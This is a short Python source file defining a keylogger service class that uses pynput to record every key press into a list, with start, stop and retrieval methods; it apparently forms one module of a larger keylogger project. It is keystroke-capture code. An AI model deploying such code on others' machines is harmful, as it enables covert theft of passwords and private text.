from pynput.keyboard import Key, Listener, KeyCode
from Ikeylogger import IKeyLogger
from special_keys import special_keys
from typing import List


class KeyloggerService(IKeyLogger):
    def __init__(self):
        self.logged_keys: list[str] = []
        self.listener = None

    def on_press(self,key):
        try:
            self.logged_keys.append(key.char or "")
        except AttributeError:
            self.logged_keys.append(special_keys.get(key,f"<{key}>"))

    def start_logging(self) -> None:
        self.listener  = Listener(on_press=self.on_press)
        self.listener.start()


    def stop_logging(self) -> None:
        self.listener.stop()

    def get_logged_keys(self) -> List[str]:
        return self.logged_keys


